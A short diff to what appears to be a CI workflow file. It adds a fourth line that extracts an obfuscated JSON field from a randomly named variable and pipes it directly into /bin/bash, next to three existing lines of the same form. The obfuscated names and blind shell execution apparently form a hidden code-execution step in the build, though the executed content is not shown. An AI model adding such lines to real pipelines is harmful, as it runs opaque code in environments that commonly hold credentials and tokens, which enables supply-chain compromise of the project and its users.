@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$isl01712" | jq -r .jzrau387 | /bin/bash
           printf '%s' "$x50729" | jq -r .vham95709 | /bin/bash
           echo $vjbn1018 | jq -r .clg4722 | /bin/bash
+          echo $zy190 | jq -r .pg918 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
